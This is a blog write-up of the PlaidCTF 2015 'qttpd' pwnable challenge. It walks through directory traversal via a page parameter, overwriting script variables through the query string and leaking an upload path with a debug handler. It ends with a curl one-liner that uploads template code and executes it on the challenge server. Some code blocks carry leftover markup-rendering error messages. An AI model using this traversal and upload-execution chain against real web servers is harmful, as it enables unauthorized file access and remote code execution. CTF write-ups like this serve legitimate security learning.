---
title: "PlaidCTF 2015 - qttpd Part 1 (pwnable 200) Writeup"
slug: "plaidctf-2015-qttpd-part-1-pwnable-200-writeup"
date: "2015-05-10 23:33:48.477190"
author_name: "coldwaterq"
author_email: "coldwaterq@gmail.com"
draft: false
toc: false
images:
---

At first this challenge looked like a Web challenge. The first problem that popped out when looking at the website was the use of *?page=about*. Anytime I see a website that has a *page=* query parameter the first thing I want to try is directory traversal. And in this case just like in many other CTFs it turned out to be the correct path to start down. Although in this case it was just the beginning.

The first value I tried for *page=* was *../*. This caused the middle of the page to contain what appeared to be binary gibberish. This contained the following intelligible information though:

{language=bash}
~~~~~~~~
.profile
.lastlogin.
errors
httpd.conf
httpd.stripped
includes
pages
www
uploads
flag1
flag2
flag3
~~~~~~~~

This appears to be a directory listing so running with that assumption we continued working.

So of course the next thing I tried was *../flag1* *../flag2* and *../flag3*. None of these worked though. So I checked *../httpd.conf* and this is what I found.

"System Message: ERROR/3 (<string>:, line 25)"
Error in "code-block" directive:
unknown option: "filename".

{language=python}
~~~~~~~~
.. code-block::
   :filename: ../httpd.conf

   num_workers = 16
   master_uid = 100
   master_gid = 100
   master_dir = /home/httpd
   worker_uid = 99
   worker_gid = 99
   chroot_dir = /home/httpd
   upload_dir = /uploads
   serve_dir = /www
   open_timeout = 5
   read_timeout = 5
   pending_timeout = 5
   finished_timeout = 5
   tmpl_timeout = 5
   tmpl_timeout_soft = 2
   tmpl_max_includes = 32
   index = index.shtml
   flag1_path = /home/httpd/flag1
   flag2_path = /home/httpd/flag2

~~~~~~~~

This tells us a few things, but the useful parts for this challenge are that the serve directory is */www*, the default file is *index.shtml*, and uploads go into */uploads*.

So the next file that I requested was the *index.shtml* in the *www/* directory, and these are the useful parts.

"System Message: ERROR/3 (<string>:, line 53)"
Error in "code-block" directive:
unknown option: "filename".

{language=python}
~~~~~~~~
.. code-block::
   :filename: ../www/index.shtml

   <@
       SCRIPT_EXT = ".shtml";
       page = "";

       include("../includes/base.inc");

       if (page == "")
           page = "index";
   @>

   ...

   <@
       path = "../pages/" . page;
       if (exists(path))
       {
           send_file(path);
       }
       else
       {
           path = "../pages/" . page . SCRIPT_EXT;
           if (exists(path))
           {
               include(path);
           }
           else
           {
               printf("File not found (%s)\n", path);
           }
       }
   @>

~~~~~~~~

Two things can be understood from this. First we see that if the file exists without the extension it sends the contents. If it exists with the extension added to the page it is executed. Second we see that *../includes/base.inc* is executed. So the next step is to see what *base.inc* does.

"System Message: ERROR/3 (<string>:, line 90)"
Error in "code-block" directive:
unknown option: "filename".

{language=python}
~~~~~~~~
.. code-block::
   :filename: ../includes/base.inc

   <@
       register_error_handler("../includes/error.inc");
       if (QUERY_STRING)
           parse_query(QUERY_STRING);
       if (POST_PATH && HTTP_CONTENT_TYPE == "application/x-www-form-urlencoded")
       {
           parse_query(read_file(".." . POST_PATH));
       }
   @>

~~~~~~~~

This shows us three things. First on an error *../includes/error.inc* is executed. So we will want to look at that. Second, the query string will clobber all variables previously set. This can be used to overwrite *SCRIPT_EXT* used in index so that any and all files can be executed as shtml. And finally Posts are written to a directory and the full file is specified in the *POST_PATH* variable. There is an uploads directory mentioned in the root directory, and since the posted data is apparently written to disk, there is a good chance that it is written to that directory. However listing that directory doesn't work, so we have to print the contents of POST_PATH to determine the file that we control the contents of.

So now let's see what *../includes/error.inc* contains so that we can maybe find a way to get the value of *POST_PATH*.

"System Message: ERROR/3 (<string>:, line 107)"
Error in "code-block" directive:
unknown option: "filename".

{language=python}
~~~~~~~~
.. code-block::
   :filename: ../includes/error.inc

   <@ if (DEBUG == "on") { var_dump(); } else { @> <@ } @>

~~~~~~~~

This is our lucky day. Because as we can see if we set the query parameter to *DEBUG=on&page=../includes/error&SCRIPT_EXT=inc* we will get all of the variables including *POST_PATH*.

Requesting that a few times you can see that the POST_PATH changes slowly. So two requests close together could be used to have one determine the file, and the next could be used to execute it. However we don't know what to execute.

This is where we have to do a bit of reversing. In the directory listing in the beginning there was a file called *httpd.stripped*. This is a binary file, and if you download it and look at the file you notice that it is an executable. So we loaded that into IDA, and used HexRays to extract the C source. The first thing I did with that source was a ctrl+f for "flag" and found that along with all the other shtml commands was a command of *get_flag*. So without reading the code it is pretty obvious that most likely the thing we need to do is call get_flag().

Now at this point, while I tried to manually make a post, and quickly make the request to execute it, my teammate tecknicaltom wrote a bash one liner to first post the shtml code to call get_flag(), execute error.inc with the debug flag set, and pull out the file that the post data was written to. Then it requested that posted data as the page, and get_flag() was executed returning the flag we needed. The uploaded files ended in .0 so he hard coded that as the extension, and stripped that from the POST_PATH returned. This makes it execute instead of just printing the contents.

The one liner is below:

{language=bash}
~~~~~~~~
POST_PATH=$(curl -i -s -X 'POST' --data-binary foobar 'http://107.189.94.252/?SCRIPT_EXT=.inc&page=../includes/error&DEBUG=on&HTTP_CONTENT_TYPE=application/x-www-form-urlencoded' | grep POST_PATH | sed 's#.* = ##; s#\.0 .*##') ; curl -i -s -X 'POST' --data-binary $'<@ printf("%s",get_flag()); @>\x0d\x0a\x0d\x0a' 'http://107.189.94.252/?SCRIPT_EXT=.0&page=..'$POST_PATH
~~~~~~~~

And the page returned contained the line:

"System Message: ERROR/3 (<string>:, line 128)"
Content block expected for the "code" directive; none found.

{language=python}
~~~~~~~~
.. code:: flag{1down_2togo_hint_650sp1}

~~~~~~~~

Then I proceeded to spend a ton of time trying to figure out the next part of qttpd but never did.
